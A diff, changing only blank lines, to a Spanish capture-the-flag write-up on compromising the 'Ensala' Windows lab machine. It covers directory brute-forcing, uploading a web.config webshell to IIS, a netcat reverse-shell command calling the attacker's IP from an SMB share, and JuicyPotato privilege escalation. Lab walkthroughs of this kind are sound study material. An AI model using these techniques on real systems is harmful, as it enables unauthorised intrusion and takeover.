@@ -9,7 +9,9 @@ tags: [Windows, Web, ISS, JuicyPotato, reverse shell]
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725200541.png)
 
 [Link Descarga](https://labs.thehackerslabs.com/machine/34)
+
 Plataforma: The Hacker Labs
+
 OS: Windows
 
 # Reconocimiento
@@ -17,9 +19,7 @@ OS: Windows
 Usamos la herramienta **Auto-Recon** para automatizar esta fase y obtener información de interés.
 
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211518.png)
-
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211555.png)
-
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725211622.png)
 
 Como vimos anteriormente, los puertos **Microsoft Windows RPC**, son puertos dinámicos del sistema.
@@ -48,7 +48,6 @@ gobuster dir -u http://192.168.192.167/ -w /usr/share/wordlists/dirbuster/direct
 este nos devuelve un resultado con status: 200, y que al acceder a él, nos encontramos con un apartado que nos permite subir archivos al sistema.
 
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725213810.png)
-
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725220625.png)
 
 ```
@@ -96,6 +95,7 @@ Como dato, también encontramos un comentario sobre el código fuente.
 Podemos ver que esta ruta nos lleva a un archivo inexistente llamado web.config u luego de investigar un poco en la red, encontramos información por parte de `hacktriks` que nos puede servir.
 
 [ISS - Internet Information Service](https://hacktricks.wiki/es/network-services-pentesting/pentesting-web/iis-internet-information-services.html)
+
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725222918.png)
 
 Entonces...
@@ -109,7 +109,6 @@ Y justamente encontramos la configuración para una webshell para el servicio IS
 Primero nos creamos el archivo web.config en nuestra máquina atacante, y pegamos el código que encontramos en `PayloadAllTheThings`, luego subimos el archivo al servidor ISS objetivo, y por último entramos a la ruta `/Subiditosdetono/web.config` y obtenemos la webshell funcional.
 
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725225904.png)
-
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725225919.png)
 
 Ya que tenemos acceso al sistema vamos a hacer unos pasos para obtener una reverse shell directamente en nuestra terminal.
@@ -131,7 +130,6 @@ Ya que tenemos acceso al sistema vamos a hacer unos pasos para obtener una rever
 `\\<NUESTRA IP>\sharedFolder\nc.exe -e cmd <NUESTRA IP> 443`
 
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725231621.png)
-
 ![](/secnotes/assets/img/windows/ensala/Pasted image 20260725231630.png)
 
 ### Explicación detallada de los pasos anteriores
@@ -185,9 +183,12 @@ Ponemos el puerto 4444 en escucha.
 Para ejecutar `JuicyPotato` debemos agregarle algunos argumentos:
 
 `-l 1234` = Define el puerto de escucha. La herramienta levanta un servidor de autenticación en este puerto interno para interceptar la conexión.
+
 `-p rshell.exe` = Especifica el programa o script a ejecutar.
+
 `-t *` = Define el tipo de token a crear (_CreateProcessWithToken_ o _CreateProcessAsUserW_)
 	Le indica a JuicyPotato que prueba ambas funciones. para instanciar el nuevo proceso. Si una falla por restricciones de la cuenta, probará automáticamente la otra.
+
 `-c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} ` = Especifica el **CLSID** (Class ID)
 	Es el identificador único de un objeto COM/DCOM específico del sistema Windows. JuicyPotato abusa de este CLSID para forzar al servicio subyacente a realizar la autenticación hacia el puerto configurado (1234)
 
